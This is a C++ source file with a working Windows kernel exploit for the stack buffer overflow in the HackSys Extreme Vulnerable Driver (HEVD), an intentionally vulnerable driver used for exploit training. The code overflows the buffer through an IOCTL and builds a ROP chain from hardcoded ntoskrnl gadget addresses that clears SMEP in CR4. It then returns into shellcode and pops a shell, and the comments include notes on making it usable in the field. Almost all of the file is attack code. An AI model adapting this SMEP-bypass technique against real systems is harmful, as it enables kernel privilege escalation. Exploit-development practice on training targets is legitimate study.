#include "PreExploitation.hpp"
#include "PostExploitation.hpp"
#include "HEVDCommunication.hpp"
#include "BufferOverflowStack.hpp"

namespace BufferOverflowStack
{

void prepare_rop(ByteVector& in_buffer, Address64 shellcode_address)
{
	const size_t return_address_offset = KERNEL_BUFFER_SIZE + 0x18;
	std::memset(in_buffer.data(), 0xAA, return_address_offset);

	// ntos base -> 0xFFFFF804B1000000
	// I have a better ROP chain in the DoubleFetch exploit.
	// I still wanted to craft the value in a more complex rop chain by myself.
	// Also, this one can be prone to control register bit pinning and the much better exploit is using a binary `and` like the one in DoubleFetch
	static constexpr Address64 ZERO_RAX = 0xFFFFF804B168EB5A;
	static constexpr Address64 MOV_RCX_0xFFFFFFFFF = 0xFFFFF804B12548AC;
	static constexpr Address64 OR_RAX_RCX = 0xFFFFF804B1246AC6;
	static constexpr Address64 SHR_RAX_0xC = 0xFFFFF804B1A78120;
	static constexpr Address64 SHL_RAX_0x4 = 0xFFFFF804B16326A5;
	static constexpr Address64 PUSH_RAX_POP_RBX = 0xFFFFF804B1A6661D;
	static constexpr Address64 MOV_RAX_MAX_INT = 0xFFFFF804B13EB0F9;
	static constexpr Address64 AND_RAX_MAXINT_E = 0xFFFFF804B1A39ADD;
	static constexpr Address64 PUSH_RBX = 0xFFFFF804B16A7161;
	static constexpr Address64 POP_RCX = 0xFFFFF804B148BAFC;
	static constexpr Address64 MOV_CR4_RAX = 0xFFFFF804B1BA57C3;

	// HEVD-StackBoF-ROP.md
	// I'm returning straight to usermode because the IOCTL is triggered from this process, so the current cr3 should be this process, no need for KeStackAttach.
	std::vector<Address64> rop_chain_raw = {
		ZERO_RAX, MOV_RCX_0xFFFFFFFFF, OR_RAX_RCX, SHR_RAX_0xC, SHR_RAX_0xC, SHL_RAX_0x4, SHL_RAX_0x4, PUSH_RAX_POP_RBX,
		MOV_RAX_MAX_INT, AND_RAX_MAXINT_E, SHL_RAX_0x4, SHL_RAX_0x4, SHL_RAX_0x4, SHL_RAX_0x4, SHL_RAX_0x4,
		SHL_RAX_0x4, SHL_RAX_0x4, SHL_RAX_0x4, SHL_RAX_0x4, SHL_RAX_0x4, SHL_RAX_0x4, SHL_RAX_0x4, SHR_RAX_0xC, SHR_RAX_0xC, SHR_RAX_0xC, SHR_RAX_0xC, SHL_RAX_0x4, SHL_RAX_0x4,
		PUSH_RBX, POP_RCX, OR_RAX_RCX,
		MOV_CR4_RAX,
		shellcode_address
	};

	size_t current_index = return_address_offset;
	for (Address64 current_gadget : rop_chain_raw)
	{
		std::memcpy(in_buffer.data() + current_index, &current_gadget, sizeof(Address64));
		current_index += sizeof(Address64);
	}
}

void exploit()
{
	HEVDCommunication hevd;

	ByteVector in_buffer;
	in_buffer.resize(IN_BUFFER_SIZE);

	Address64 shellcode_address = PreExploitation::prepare_shellcode();
	prepare_rop(in_buffer, shellcode_address);

	DEBUG_PRINT(std::to_string(shellcode_address));

	// TODO: the rop should and rc4 with rax not mov, this enables all mitigations basically
	// TODO: the shellcode will probably won't work in a live-action scenario because it is really important to not change any other bits
	// also, returning SMEP after the cmd pop will be required for field usage, this is just a POC :)

	std::ignore = hevd.call_ioctl(BUFFER_OVERFLOW_STACK_IOCTL, in_buffer, sizeof(Address64));

	PostExploitation::pop_shell();
}

}